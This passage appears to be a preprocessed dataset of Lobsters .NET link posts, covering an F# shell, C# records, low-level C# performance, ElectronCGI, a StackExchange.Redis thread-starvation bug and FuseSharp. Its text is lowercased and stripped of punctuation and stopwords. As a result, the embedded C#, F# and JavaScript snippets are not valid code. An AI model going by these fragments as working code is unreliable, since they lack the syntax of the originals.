fifth last characterwe inadvertently fixed bug optimizing api netcore adding test document bug ensure regressso fixed net core still broken current latest version net framework look like broken mono tooa workaround net would repad incorrectly padded string something like work without space linebreaks string repad string var l return l l l also published dev medium
179,Lobsters,dotnet,"C#, F#, .NET programming",FSH: A shell with integrated F# scripting,https://github.com/ChrisPritchard/FSH,fsh shell integrated f scripting,fsh f sh basic interaction example note note linuxosx note linuxosx installing running net core issue src fshsln test important builtins help cd path echo text cat filename filename rm mkdir env builtinsfs code expression fsi interaction fsi expression piped value loading composing code interaction interactivefs f applied competition update linereaderfs lineparserfs programfs finally friendly interactive shell,fsh fsh f shell pronounced like fish shell like cmd powershell bash entirely written f basic interaction addition normal shell feature folder navigation creation deletion echo etc fsh also support piping f interactive run code declare f function use function part piping operation builtin command also declare anonymous expression piping demonstrate mean using fsh could type line like echo hello world fun stoupper resulttxt would create text file current directory called resulttxt containing text hello world see sample pipe processable token like command code use like f run f code wrap sample builtin command echo argument hello world piped code expression fun stoupper piped resulttxt file special pipe sends file rather console also supported append rather overrite type text coloured automatically type expression typing example something advanced could implement simple grep command grep built fsh default let grep string arr arr arrayfilter fun line linecontains note shiftaltcontrolenter go new line useful code tabbing four space work well shunting current line forward also piping arr second line line parameter need type annotation note linuxosx terminal systemconsoleconsolemodifiers nt work well together aside shift control alt also work enter new line find work altenter worked ubuntu note linuxosx issue newlines platform due inconsistency systemconsole textwriter cursortop something work presently investigating issue issue use like l grep dll list dll file current directory one per line used token builtins like echo l example wanted get list template dotnet cli support f dotnet new fun sa sa seqfilter fun scontains f machine print console application console c f vb commonconsole class library classlib c f vb commonlibrary unit test project mstest c f vb testmstest installing running fsh built using net core build need install sdk tested linux via ubuntu wsl vm max osx minor issue see issue github run command line navigate src directory use command dotnet run built visual studio community occasional work done v code instead cli could open fshsln solution file run using v also xunitfsunit test defined test testing various input scenario partstokenisation function run wish via dotnet test test directory important built month shell lot complicated look bug hopefully casual use wo nt find builtins shell number command run aside thing like external process case fsh code fsh support limited set basic effective functionality get list type help common example cd path change current directory eg cd cd go root one directory echo text print argument text quite useful piping cat filename read file print output also useful piping filename print piped content file overwrites appends instead almost dozen command like rm mkdir env etc builtins defined builtinsfs code expression code expression written wrapping code outer parenthesis parsed wrapper example fun string stoupper perfectly fine code expression first expression line treated fsi interaction otherwise treated fsi expression difference fsi interaction valid f code let x let grep string arr arr arrayfilter fun line linecontains valid interaction fsi expression must f evaluates value let x valid expression let x x valid evaluate likewise defining function like let grep valid unless immediately used expression like let grep grep dll also locally scope grep making usable without redefined piped value expression run value piped fsh additional contraint must support parameter match piped value either string string array reason echo test fun stoupper code passed hidden fsi process actually let piped test piped fun stoupper normally piped value string however prior result contains line break split array eg l dir used directory one file produce piped string array code expression use expression return either value string array latter concatenated line break output printing otherwise converted string loading composing code special code expression token parsed treat piped value code example say ran line echo printfn hello world fsh greeterfs could read evaluate file using cat greeterfs resulting output hello world fsh printed console likewise could compose without file like echo printfn fsh say hello world get fsh say hello world printed console interaction default fsi evaluate interaction return unit successful order make interaction useful first token piped expression interaction evaluated fsh attempt evaluate expression send value next token console last expression evaluation fails empty string passed along otherwise found set value passed along cleared case use later interaction nt overwrite code run interactivefs wrap fsi detail please follow code developed f applied competition educational project course month update one competition category proud say full result idea came powershell developer work primarily window machine default shell however powershell syntax verbose especially using net code inline shell simpler bash cmdlike syntax combined light syntax type inferrence f seemed like good thing make proofofconcept stand fsh really intended used anger support host builtins quite extensible fsi integration missing lot feature example numerous flag default builtins lsdir list local directory nt example flag provide info multi page support etc someone wanted take extend free mit primarily fsh serf educational example creating shell able run command external executables various folder file manipulation technique custom readline method support advanced feature like line shifting history defined linereaderfs string tokensisation defined lineparserfs integrating f interactive project useful way code file helpfully commented start programfs follow structure hope useful reader topic finally know another shell called fish friendly interactive shell else would call f shell fsh
181,Lobsters,dotnet,"C#, F#, .NET programming",C# 8.x is introducing Records,http://www.devsanon.com/c/c-8-is-introducing-records/,c introducing record,iequatable,quite often architectural design tend use dtos never heard dto basically stand data transfer object meant describe class bussiness logic whatsoever included hold different type data pas around many case dtos include readonly property field internally often writing code class feel like writing lot boilerplate code well c coming simplify process creating class introducing record clear initially planned c version due important feature complexity feature postponed point version unclear path etc record syntax basically letting compiler work u produce code without u writing unlike code snippet use shortcut key generate template code u fill new syntax simply telling compiler type class want compiler generates u example could following line code public class person string name string surname string address datetime dateofbirth simple line code expanded much larger class also implement iequatable using system public class person iequatable public string name get public string surname get public string address get public datetime dateofbirth get public person string name string surname string address datetime dateofbirth thisname name thissurname surname thisaddress address thisdateofbirth dateofbirth public bool equal person return equal name othername equal surname othersurname equal address otheraddress equal dateofbirth otherdateofbirth public override bool equal object return person equal true public override int gethashcode return namegethashcode surnamegethashcode addressgethashcode dateofbirthgethashcode public void deconstruct string name string surname string address datetime dateofbirth name thisname surname thissurname address thisaddress dateofbirth thisdateofbirth public person string name thisname string surname thissurname string address thisaddress datetime dateofbirth thisdateofbirth new person name surname address dateofbirth see property record readonly get exact initialized constructor addition value equality correctly override gethashcode method use hashbased collection dictionary hashtable apart see deconstruct also implemented simply deconstruct instance class syntax lot similar valuetuple like following var name surname address dateofbirth person last thing see generated class method also new introduction language immutable mutable class expression produce new instance single value changed like following var bornyesterday personwith dateofbirth datetimenowadddays one line code simpler cleaner smoother please follow like u
182,Lobsters,dotnet,"C#, F#, .NET programming",Is C# a low-level language?,http://www.mattwarren.org/2019/03/01/Is-CSharp-a-low-level-language/,c lowlevel language,c lowlevel language fabien sanglard book hansleminutes podcast deciphered postcard sized raytracer day job c lowlevel language excellent post linebyline port unobfuscated c code c story c c value type implementation detail namely fabien post value reference adam sitniks post performance trap ref local ref return c performance long time gist result naive linebyline port timewindows inlining analyzer cpu instruction instruction disasmo addin sharplabio intrinsics instance mathpow implemented net framework result simple performance improvement remove inline array initialisation stack overflow answer andrey akinshin conclusion diff using mathf function instead math systemmathf class tiered compilation note support net framework netstandard performance improvement c code available compiler explorer c lowlevel language language feature c f vbnet bclruntime functionality enable lowlevel programming note ref return ref local faster unsafe code net managed pointer net c series part span universal memory management interoperability c programming guide asked twitter ben adam marc gravell marc gravell kevin jones theodoros chatzigiannakis damageboy robert haken victor baybekov victor baybekov ben adam victor baybekov alexandre mutel alexandre mutel omario kouji kozy matsui frank krueger konrad kokosa sebastiano mandalà nino floris summary would say c certainly let write code look lot like c conjunction runtime baseclass library give lot lowlevel functionality hacker news rprogramming rdotnet rcsharp reading,c lowlevel language mar word massive fan everything fabien sanglard love blog read book covertocover info book check recent hansleminutes podcast recently wrote excellent post deciphered postcard sized raytracer unpacking obfuscated code providing fantastic explanation math involved really recommend take time read got thinking would possible port c code c partly day job write fair amount c recently realised bit rusty thought might help significantly wanted get better insight question c lowlevel language slightly different related question suitable c system programming really recommend joe duffy excellent post linebyline port started simply porting unobfuscated c code linebyline c turn pretty straight forward guess story c c true let look example main data structure code vector code sidebyside c left c right syntax difference net let define value type able get functionality significant treating vector struct mean get better data locality net garbage collector gc need involved data go onto stack probably yes know implementation detail info structs value type net see particular last post form eric lippert contains helpful quote make clear value type really surely relevant fact value type implementation detail allocated rather bydesign semantic meaning value type namely always copied value relevant thing allocation detail called heap type stack type relevant time time relevant thing copying identity semantics let look method look sidebyside c left c right first raytracing next querydatabase see fabien post explanation function point c let u easily write c code case help u ref keyword let u pas value reference able use ref method call quite recently effort allow ref place sometimes using ref provide performance boost mean struct need copied see benchmark adam sitniks post performance trap ref local ref return c information however important scenario allows u behaviour c port original c code although want point managed reference known exactly pointer notably arithmetic see performance well good able port code ultimately performance also matter especially something like ray tracer take minute run c code contains variable called samplecount control final quality image samplecount look like clearly realistic however get samplecount thing look lot better running samplecount mean rendering take long time following result run set mean test run completed minute changing samplecount affect number iteration outermost loop code see gist explanation result naive linebyline port able give meaningful sidebyside comparison c c version used timewindows tool port unix time command initial result looked c v net framework net core elapsed time sec kernel time user time page fault working set kb paged pool kb nonpaged pool page file size kb initially see c code quite bit slower c version get better see however let first look net jit u even naive linebyline port firstly nice job inlining smaller helper method see looking output brilliant inlining analyzer tool green overlay inlined however inline method example querydatabase skipped complexity another feature net justintime jit compiler provides converting specific method call corresponding cpu instruction see action sqrt wrapper function original c code note call mathsqrt intnv square root public static vec operator vec q return q float mathsqrt q q assembly code net jit generates call mathsqrt make use vsqrtsd cpu instruction assembly listing method program sqrtf float float emitting blendedcode cpu avx window compilation optimized code rsp based frame partially interruptible final local variable assignment float outargs lclblk outgoingargspace lcl frame size vzeroupper vsqrtsd ret total byte code prolog size method program sqrtf float float get output need following instruction use disasmo addin take look sharplabio replacement also known intrinsics see jit generating code snippet show mapping jit also target arm full method bool compiler istargetintrinsic corinfointrinsics intrinsicid defined defined defined legacybackend switch intrinsicid instruction directly compute sqrtabs instruction directly compute roundceilingfloor todo backend target sse floatingpoint code treat sine cosine round intrinsics implemented intrinsics instruction pose cq problem may necessary change implementation helper call decrease call overhead switch back instruction tracked case corinfointrinsicsqrt case corinfointrinsicabs return true case corinfointrinsicround case corinfointrinsicceiling case corinfointrinsicfloor return compsupports default return false see method implemented like eg sqrt ab others clr instead us c runtime function instance powf entire process explained nicely mathpow implemented net framework also see action coreclr source result simple performance improvement however wanted see naive linebyline port could improved profiling made two main change remove inline array initialisation switch mathxxx function mathfxxx counterpart change explained depth remove inline array initialisation information necessary see excellent stack overflow answer andrey akinshin complete benchmark assembly code come following conclusion conclusion net cache hardcoded local array kind roslyn compiler put metadata overhead case unfortunately yes jit copy array content metadata invocation work longer case static array runtime also allocates object produce memory traffic care depends hot method want achieve good level performance use static array cold method affect application performance probably write good source code put array method scope see change made diff using mathf function instead math secondly significantly got big perf improvement making following change intnv square root public static vec operator vec q return q mathfsqrt q q else public static vec operator vec q return q float mathsqrt q q endif net standard specific float implementation common math function located systemmathf class information api implementation see change c code slower c version c v c net framework net core tc net core tc elapsed time sec kernel time user time page fault working set kb paged pool kb nonpaged pool page file size kb tc tiered compilation believe default net core completeness result across several run run c v c net framework net core tc net core tc note difference net core net framework due lack mathf api net framework info see support net framework netstandard performance improvement however sure others better interested trying close gap c code available comparison see assembly produced c compiler courtesy brilliant compiler explorer finally help output visual studio profiler showing hot path perf improvement described c lowlevel language specifically language feature c f vbnet bclruntime functionality enable lowlevel programming yes know lowlevel subjective term note c developer going different idea lowlevel mean feature would taken granted c rust programmer list came ref return ref local tl dr pas return reference avoid large struct copying type memory safe even faster unsafe unsafe code net core c language defined preceding chapter differs notably c c omission pointer data type instead c provides reference ability create object managed garbage collector design coupled feature make c much safer language c c managed pointer net however another pointer type clr managed pointer could defined general type reference may point location beginning object c series part span universal memory management systemspan stackonly type ref struct wrap memory access pattern type universal contiguous memory access think implementation span contains dummy reference length accepting memory access type interoperability c programming guide net framework enables interoperability unmanaged code platform invoke service systemruntimeinteropservices namespace c interoperability com interoperability com interop however know limitation asked twitter got lot reply add list ben adam platform intrinsics cpu instruction access marc gravell simd via vector mix well span fairly low net core soon offer direct cpu intrinsics explicit usage targeting particular cpu ops marc gravell powerful jit thing like range elision arraysspans jit using perstructt rule remove huge chunk code know reached particular cpu bitconverterislittleendian vectorishardwareaccelerated etc kevin jones would give special shoutout memorymarshal unsafe class probably thing systemruntimecompilerservices namespace theodoros chatzigiannakis could also include makeref rest damageboy able dynamically generate code fit expected input exactly given latter known runtime might change periodically robert haken dynamic il emission victor baybekov stackalloc mentioned also ability write raw il dynamic save delegate call eg use cached ldftn call via callus proj template make trivial via extern method methodimploptionsforwardref ilasmexe rewrite victor baybekov also methodimploptionsaggressiveinlining enable lowlevel programming sense allows write highlevel code many small method still control jit behavior get optimized result otherwise uncomposable locs method ben adam using calling convention abi underlying platform pinvokes interop might thing though victor baybekov also since mentioned fsharp inline keyword job il level jit deemed important language level c lack far lambda always virtual call workarounds often weird constrained generic alexandre mutel new simd intrinsics unsafe utility classil post processing eg custom c upcoming function alexandre mutel related il f support direct il within language example omario binaryprimitives lowlevel safe http docsmicrosoftcomenusdotnetapisystembuffersbinarybinaryprimitives kouji kozy matsui native inline assembler difficult relation toolchains runtime replace current pinvoke solution inlining frank krueger ldobj stobj initobj initblk cpyblk konrad kokosa maybe thread local storage fixed size buffer unmanaged constraint blittable type probably mentioned sebastiano mandalà two cent everything said something simple struct layout padding memory alignment order field may affect cache line performance something investigate nino floris constant embedding via readonlyspan stackalloc finalizers weakreference open delegate methodimploptions memorybarriers typedreference varargs simd unsafeasref coerce struct type layout match exactly used ao taskawaiter version summary would say c certainly let write code look lot like c conjunction runtime baseclass library give lot lowlevel functionality discus post hacker news rprogramming rdotnet rcsharp reading unity burst compiler
183,Lobsters,dotnet,"C#, F#, .NET programming",SharpKit: C# to JavaScript Compiler,https://github.com/SharpKit/SharpKit,sharpkit c javascript compiler,sharpkit http githubcomsharpkitsharpkitsdk http sharpkitgithubio http githubcomsharpkitsharpkitreleases pathchanges,sharpkit c javascript compiler repository contains complete fully functional source code sharpkit crosscompiler library definition jsclr framework useful library http githubcomsharpkitsharpkitsdk contributing maybe see le commits recently belive u sharpkit still activly used lot project want contribute feel free send u patch request project membership important task every help replacing nrefactory roslyn welcome documentation link http sharpkitgithubio building installer available http githubcomsharpkitsharpkitreleases build source code follow window git clone http githubcomsharpkitsharpkitgit cd sharpkit configure make build debug version build release version please use make release linux git clone http githubcomsharpkitsharpkitgit cd sharpkit chmod x configure configure make creating installer without publishing new version verify versionfile root directory change version number needed configure called already need call cd contribinstaller create installer created contrib directory used window linux note create installer linux used window windowsonly libaries missing generate window better compatibility change previous version pathchanges wiki page contains change made file system installation sharpkit previous version
184,Lobsters,dotnet,"C#, F#, .NET programming",ElectronCGI - Cross Platform .Net Core GUIs with Electron,https://www.blinkingcaret.com/2019/02/27/electron-cgi/,electroncgi cross platform net core gui electron,update fastest framework use serve request web net core support wpf winforms electroncgi npm package electroncgidotnet nuget package electroncgi node npm package electroncgidotnet nuget package electronnet edgejs qt binding c net costly work cgi common gateway interface benefit term speeding compilation time published selfcontained executable early day asynchronous apis node,update new version electroncgi find exciting moment net core first came support linux mac window since matured point aspnet core one fastest framework use serve request web although good web side thing desktop given amount attention even though net core support wpf winforms still leaf linux mac blog post crossplatform way developing desktop application using net core electron called electroncgi rely running web server net core code precompiled show simple using electroncgi configure nodejselectron ui run code net core console application example request type greeting string argument sent net application responds string contains greeting nodejselectron adding electroncgi npm package const connectionbuilder require electroncgi const connection new connectionbuilder connectto dotnet run project netcoreproject build connectionsend greeting john greeting consolelog greeting print hello john net console application adding electroncgidotnet nuget package using electroncgidotnet static void main string args var connection new connectionbuilder withlogging build expects request named greeting string argument return string connectionon string string greeting name return hello name wait incoming request connectionlisten need start video show easy setup simple development workflow video also github link electroncgi node npm package electroncgidotnet nuget package even though already way create electronnodejs application run net code felt involved could provide better development experience probably popular way ui running electron running net code electronnet way work net code run full aspnet application electron app display web page rendered serverside aspnet also electron functionality exposed aspnet application using web socket send requestscommands initiated aspnet code example possible open new electron window aspnet controller way biggest drawback see approach even though goal create desktop application still handle lot task foreign scenario example create new aspnet core mvc application come cookie policy http configuration hsts routing etc desktop application scenario make sense end getting way ideally want write ui using html cs bit javascript able invoke net code response user action alternative electronnodejs edgejs work enabling net code run inprocess node although technologically impressive requirement make using little bit hard hello world using edgejs var edge require edge var helloworld edgefunc function async return hello world helloworld function error result error throw error consolelog result log hello world yes c code inside using use template string still get intellisense also way bring method precompiled dll however requirement method specific signature func object task object also mention fully native solution one come mind qt qt lot going used well know name tesla model dashboard run qt example qt binding several language including c net problem qt thinking something commercial becomes costly tune per developer per year given think space one way crossplatform desktop application work electroncgi draw inspiration first dynamic web request made reality early day web early day thing web server able serve static web page serve dynamic page idea external executable take representation web request produce response put forward way executable got web request header environment variable request body sent standard input stream stdin processing request executable would send resulting html back web server standard output stream stdout way thing called cgi common gateway interface mechanism available operating system work perfectly well super fast easy use example bash write something like l redirecting stdout l stdin exactly electroncgi take advantage using nodejs net example implementation right reason work runtimeslanguages connection created nodejs net console application electroncgi launch net application grab hold stdin stdout stream also keep net application running connection closed every time request sent ie connectionsend requesttype args callbackfn request serialised json written net application stdin stream handling request net core application sends response back stdout ie connectionon argtype returntype requesttype handlerfunction electroncgi take care end thing need send request nodejs provide request handler request net using stdinstdout communication channel provides little overhead performed quick test able sequentially send request receive response one second benefit mentioned electroncgi net core create application run linux window mac use c also want since nuget package net electroncgidotnet target net standard use full net framework version able run window though might still interesting net web developer want use html cs build ui reusing existing net code might speaking reusing existing net code even though requirement net application connect console app restriction console application add dependency mean bring nuget package reference net project might want use development experience also quite good establish connection electron app using dotnet run example const connectionbuilder require electroncgi const connection new connectionbuilder connectto dotnet run project pathtodotnetproject build taking approach make change net project thing need see take effect refresh page leave enabled even access chrome dev tool electron refresh new connection created cause dotnet run executed compile run project pending change imagine development experience make change ui andor net code see applied ctrlr also thanks good work net team term speeding compilation time really feel seamless done always connect published selfcontained executable extra performance boost application depend net sdk also need debug net code use attach functionality visual studio code full visual studio attach running process add breakpoints early day still rough edge electroncgi particularly error handled right enable logging net new connectionbuilder withlogging pathtologfile see something went wrong net side thing exception message quite descriptive example electroncgidotnethandlerfailedexception request handler request type division failed systemdividebyzeroexception attempted divide zero whenever unhandled exception net connection lost nodejselectron connection ondisconnect method invoked use example restart connection const connectionbuilder require electroncgi let connection new connectionbuilder connectto dotnet run project dotnetcalculator build connectionondisconnect alert connection lost restarting connection new connectionbuilder connectto dotnet run project dotnetcalculator build keep mind maintain state net since executable start connection made kept running listening request connection closed connectionclose nodejselectron exception happens state lost behavior might ideal people feel inclined error surface nodejs callback first argument request much like custom asynchronous apis node example connectionsend requesttype args err data err handle error return otherwise handle data another thing might useful add ability initiate request either end connection right create connection nodejs net application send request node net reason add ability send request net node connection established another aspect need improvement one particular net implementation way request currently handled right request handler served stdin monitored mean request handler take long time run subsequent request originating node queued net application long running request finish also option register handler request would welcomed currently different way register handler request type handler request type requesttype argument return value void string requesttype action handler handler request type requesttype argument type return value void string requesttype action handler handler request type requestype argument tin return type tout void tin tout string requesttype func tin tout handler async handler request type requesttype argument type return value void onasync string requesttype func task handler async handler request type requesttype argument type return type tout void onasync tin tout string requesttype func tin task tout handler possible use dynamic argument type term thing missing documentation certainly one specifically use electroncgi electron react angular vue blazor web ui framework might missing related
185,Lobsters,dotnet,"C#, F#, .NET programming",Fun with the Spiral of Death,https://blog.marcgravell.com/2019/02/fun-with-spiral-of-death.html,fun spiral death,took stack overflow offline stackexchangeredis multiplexing happened next done theory compile threadoriented inside sync path happened noone conch actually went wrong thread called thing almost impossible surprisingly minimal elegant fix directly nt end story,subtitled cautionary tale semaphoreslim adventure two part part want discus fun series problem asynchronous code fun mean took stack overflow offline partly fun story mostly think really useful learning point general adventure asynchronicity part want look implementation detail eventual fix cover slightly advanced theme around implement awaitable code nontrivial scenario took stack overflow offline side note many theme run handinhand david damian recent presentation aspnet core application wo nt scale ndc nt seen yet go watch particular everything around application work fine suddenly nt nt syncoverasync asyncoversync lot journey relates migration stackexchangeredis use pipeline new io layer net previously discussed love pipeline one key design choice stackexchangeredis library implement multiplexing allow multiple concurrent calling thread communicate underlying socket server keep socket count low also helping reduce packet fragmentation mean need synchronization around many caller thread access underlying socket pipeline migration code basically synchronous bit complex close enough write actual command code could expressed take liberty readability readonly object synclock new object single writer void writemessage message message bool havelock false try monitortryenter synclock timeout ref havelock havelock throwtimeout actuallywritethething message flush finally havelock monitorexit synclock fairly normal style coding tryfinallymonitorhavelock code standard implementation lock timeout really try acquire exclusive access socket guarded synclock successful write flush reasonable moved pipeline one defining feature pipeline implementation key step async might assume write async since write buffer pool nt actually case flush async flush pipeline achieves different thing necessary activates consumer pulling work pipe sending next step socket case provides backpressure provider writemessage case consumer falling behind much backlog slow provider asynchronous way nt get unbounded buffer growth neat switching synchronous code api us async always trivial async begets async start going async go async bad thing lazy figured hey flush almost always complete synchronously anyway probably get away syncoverasync narrator nt get away something like readonly object synclock new object single writer void writemessage message message bool havelock false try monitortryenter synclock timeout ref havelock havelock throwtimeout actuallywritethething message flushsync finally havelock monitorexit synclock void flushsync evil hack use var flush flushasync flushiscompletedsuccessfully flushwait iscompletedsuccessfully check use many tasklike awaitable result see completed synchronously without faulting safe access result etc available already good trick avoiding async statemachine complication highthroughput code typically library code application code bad bit wait nt already completed syncoverasync happened next key thing keep mind stackexchangeredis expose synchronous asynchronous apis ie twin method example redisvalue stringget rediskey key task redisvalue stringgetasync rediskey key internally implemented differently get job done minimum fuss overhead calling writemessage point actually never afraid doubledown antipatterns mean async caller effectively asyncoversyncoverasync ouch writemessage code used synchronous asynchronous call path happens much internal existing application codebase mostly us synchronous path gradually adding async need complete inprogress transition net framework net core able extensively synchronous path always going blocked anyway perspective synchronous caller really much wrong promise execute synchronously problem come asynchronous caller thought calling stringgetasync thread got blocked golden rule async nt block async caller unless really really broke rule report user big threadjams async call path stuck writemessage one thread paused flush thread trying obtain lock note problem nt backlog happened delay business normal happens especially need mutexlike semantics problem blocked worker thread although least good grace include timeout heavy load caused threadpool starvation cascading failure watch video done theory given synchronous asynchronous callpaths two version write code void writemessage message message valuetask writemessageasync message message get immediate problem talk locking mechanism see clearly use simple lock rather complex monitor usage following compile async valuetask foo lock synclock await body lock statement await taskdelay someamount reason nt work lock aka monitor threadoriented need try enter take lock exit release lock constrained region thread moment await saying might continue synchronously might resume later different thread actually two consequence would mean try release lock fail resuming thread probably wo nt actually await releasing current thread back whatever else need could actually end calling back monitor reentrant meaning lock actually lock successfully maintains counter internally mean code completely unrelated execution context could incorrectly end inside lock resumed await logically released side note worth knowing compiler spot use lock use manual monitor code timeouts wo nt warn need know perhaps good motivation lock timeout language feature fortunately know moved next obvious locking primitive semaphoreslim semaphore like monitor instead threadbased purely counterbased theoretically use semaphore say reality often used mutex saying semaphoreslim particularly enticing synchronous asynchronous apis allowing u split code two fairly neatly readonly semaphoreslim singlewriter new semaphoreslim single writer void writemessage message message singlewriterwait timeout throwtimeout try actuallywritethething message flushsync hack finally singlewriterrelease async valuetask writemessageasync message message await singlewriterwaitasync timeout throwtimeout try actuallywritethething message await flushasync finally singlewriterrelease look broadly similar new semaphoreslim initializes semaphore limit ie mutex synchronous path work mostly like always asynchronous path used asynchronous caller correctly release worker thread back wherever worker thread go either ca nt get lock yet waiting rather awaiting flush still syncoverasync sync path really problem case completely fixed async path short removing optionally disabling sync path idea putting serious thought optin thing probably good get look like work chance would completely solved problem seen consumer heavily asynchronous workload one nice thing working stack overflow opportunity dogfood library release stack overflow load nt big big stretch comfortably big enough give confidence library nt pathologically broken dropped change production testing etc boom went happened fortunately lucky enough manage grab process dump production server deaththroes stood back older version library stacktraces doomed process interesting pretty verbose something kept recurring note inverted summarised trace readability writemessage systemthreadingsemaphoreslimwait systemthreadingsemaphoreslimwaitasync kernelbase waitformultipleobjectsex case thread almost critically noone actually lock nobody anything useful semaphore edge case failed activate lucky winner conch actually went wrong looking synchronous writemessage implementation calling wait semaphore calling waitasync blocking kernel object despite looking odd nt actually terrible idea turn semaphoreslim different strategy us internally using synchronous wait call handle everything using regular synchronous code syncronous block using waitasync want release caller promptly need maintain queue actually linkedlist waiting caller task bool release something take next item one end list reactivates trysetresult caller using mixture wait waitasync ca nt get access immediately us waitasync approach wait waitasync consumer queue otherwise two separate queue get confusing unpredictable seems fine turn way using trysetresult problematic nt using trysetresult directly instead enqueuing work item trysetresult actually good albeit legacy reason thread stealing another problem contend many time call trysetresult etc task usually via taskcompletionsource possible likely even async continuation going run immediately inline thread called trysetresult something need really careful lead dedicated io thread somehow ending serving web request generally expected scenario presented got spiral death due brief blip flushasync worker got stuck wait waitasync path thing meant unblock everything needed worker release resource need resource resource currently exhausted almost impossible recover situation due growth limit worker server became increasingly unstable stopped working completely clearly dangerous scenario reported issue amazingly within day stephen toub surprisingly minimal elegant fix semaphoreslim commit message code change explain depth configuring queued task taskcreationoptionsruncontinuationsasynchronously flag mean release code call trysetresult directly without needing extra worker intermediary specific case thing waiting task synchronous wait task code already specific detection unblock scenario directly without needing worker genuine asyncawait case end actual work going queue rather call trysetresult going queue tidy nt end story would nice say well end well bug semaphoreslim fixed nt easy fix semaphoreslim merged wo nt help u next net framework service release b library author ca nt rely service release consumer machine need fix work reliably everywhere whilst great know pain improved thing future user semaphoreslim needed something immediate frameworkindependent went away created bespoke synchronousasynchronous mutexslim using stackexchangeredis amazing much simpler thing become limit people pool nt actually much work thought knew lot asyncawait yet writing mutexslim dove deeper topic usually second part talk learned
186,Lobsters,dotnet,"C#, F#, .NET programming",Multidimensional Arrays in C#,https://glenmccallum.com/2019/02/19/multidimensional-arrays-in-csharp/,multidimensional array c,multidimensional array jagged array multidimensional array jagged array resource http http docsmicrosoftcomenusdotnetcsharpprogrammingguidearraysmultidimensionalarrays http docsmicrosoftcomenusdotnetcsharpprogrammingguidearraysjaggedarrays,yesterday working array got hung basic error message couple object type converted type convert int int much internet direct hit error string maybe easy java background tripped minute declaring multidimensional array c java valid java valid c int array new int c multidimensional array think matrix jagged array think array array multidimensional array key point simpler syntax slower overhead dimension length new int jagged array dimension length vary new int new int new int new int new int new int new int realize notsosubtle difference lot resource web available resource http http docsmicrosoftcomenusdotnetcsharpprogrammingguidearraysmultidimensionalarrays http docsmicrosoftcomenusdotnetcsharpprogrammingguidearraysjaggedarrays
188,Lobsters,dotnet,"C#, F#, .NET programming",PlasticSCM/FuseSharp: FUSE wrapper in .NET Standard for macOS,https://github.com/PlasticSCM/FuseSharp,plasticscmfusesharp fuse wrapper net standard macos,fusesharp fuse macos goal net standard feature usage scenario none sshfs ext ext filesystem ntfs filesystem xfs xfs filesystem procfs procfs filesystem provided default accessibility f youtube f fusezip setup usage target machine need installed library example application filesystemhandler argument usual args question write buffer size question write buffer size fuse fuse question write buffer size fuse fuse fuse fuse osxfuse mount option osxfuse mount option osxfuse mount option project overview performance test sequential writes concurrent writes big file writes sequential read concurrent read big file read license,fusesharp fusesharp fuse wrapper macos gnulinux future developed c códice software provides clean api designed specifically enable development userspace filesystems net application fusesharp us net standard feature highly interoperable net platform core mono xamarinmac goal goal project provide api enables c application easily implement filesystem userspace api written c solely relies net standard feature compatible following net platform platform minimum version net core net framework mono xamarinmac usage scenario stumbled repository accident might wondering would want need build filesystem user space answer filesystem add layer abstraction empowers eas use case might thought said f running user space let fuse heavy lifting need focus really matter developmentwise know filesystem let watch youtube video locally stored machine without navigate web portal add transparent encryption layer directory tree let user secure storage without deal file encrypted decrypted fusepowered filesystem implementation wild might inspire mind none developed using fusesharp let u know implement one library sshfs mount remote directory tree ssh connection ext provides ext filesystem support macos read default write enabled provides ntfs filesystem support macos read write xfs provides xfs filesystem support macos procfs implement procfs filesystem macos provided default accessibility f filesystem expose application running computer user interface element said application expose including property gui component youtube f youtubefs enables browse favorite youtube video locally desktop without going youtube website fusezip implement filesystem navigate extract create modify zip archive based libzip implemented c working zip archive real directory setup usage project available nuget order start using must follow step clone repository install dependency glib available macos user brew net core sdk apple developer tool compile install adaptor library executing buildandcopy script located srcadaptor compile fusesharp library example application executing dotnet build srcfusesharp oppening fusesharp solution ide choice building complete step add fusesharpdll assembly project dependence distribute application us fusesharp bear mind order run application target machine need installed adaptordylib library compiled step example application also browse play example application located srcfusesharpexample application selfexplanatory executed without argument implement two different userspace filesystems mirror creates mirror f mounted specified path mirroring content root path specified encrypted creates encrypted f mounted specified path mirroring encryptingdecrypting content root path specified fly implement filesystem need subclass filesystem type overriding necessary method browse example see little gif demonstrating work finished filesystem mounting easy using myownfilesystemimpl f new myownfilesystemimpl targetroot using filesystemhandler fsh new filesystemhandler f args int result fshstart filesystemhandler argument argument used instantiate filesystemhandler instance end passed fuse fuse argument documentation sometimes hard find collected tested following appart usual args option description source bigwrites fuse driver option enabled maxwrite question write buffer size maxwrite libfuse option max write size byte question write buffer size fuse fuse writebackcache libfuse option question write buffer size fuse fuse spliceread splicewrite splicemove activate splicing operation fuse fuse directio file system may know size file provide could file content streamed difficult impossible know size file content could dynamically changing may make sense advertise size getattr time find size changed read write time procfs good example osxfuse file system need file system would like able allow read writes without file size mattering nt normally possible normal io path kernel particular short read userspace file system zero filled osxfuse directio option cause osxfuse use alternative direct io path kernel userspace file system path make file size irrelevant read go file system keep returning data also automatic zero filling particular implementation side effect io path bypass unified buffer cache altogether directio rather abnormal mode operation mac o x standpoint unless file system requires mode would nt recommend using option osxfuse mount option iosize iosizen n io size byte use option specify io size osxfuse use accessing hypothetical storage device corresponding osxfuse volume minimum possible io size byte whereas largest size must also power osxfuse mount option autoxattr default osxfuse provides flexible adaptive mechanism handle extended attribute including thing finder info resource fork acls initially forward extended attribute call userspace file system latter implement extended attribute function osxfuse remember forward subsequent call store extended attribute apple double file userspace file system implement extended attribute function choose handle extended attribute certain extended attribute userspace file system want osxfuse kernel handle file return enotsup attribute autoxattr option tell osxfuse bother sending extended attribute call userspace regardless whether userspace file system implement relevant function autoxattr kernel always use file osxfuse mount option project overview filesystems macos live kernel modification would require kernel extension avoid fuse filesystem userspace developed allows userspace program supply filesystem kernel developer thus free implement filesystem however wish fuse project consists two component fuse kernel module libfuse userspace library libfuse provides reference implementation communicating fuse kernel module fuse filesystem typically implemented standalone application tthat link libfuse later provides function mount filesystem unmount read request kernel send response back addition registering new filesystem fuse kernel module also register devfuse block device device serf interface userspace fuse daemon kernel general daemon read fuse request devfuse process writes reply back devfuse figure show fuse along fusesharp highlevel architecture user application performs operation mounted fuse filesystem vfs route operation fuse kernel driver driver allocates fuse request structure put fuse queue point process submitted operation usually put wait state fuse userspace daemon pick request kernel queue reading devfuse process request processing request might require entering kernel example case stackable fuse filesystem daemon submits operation underlying filesystem eg case blockbased fuse filesystem daemon read writes block device done processing request fuse daemon writes response back devfuse fuse kernel driver mark request completed wake original user process filesystem operation 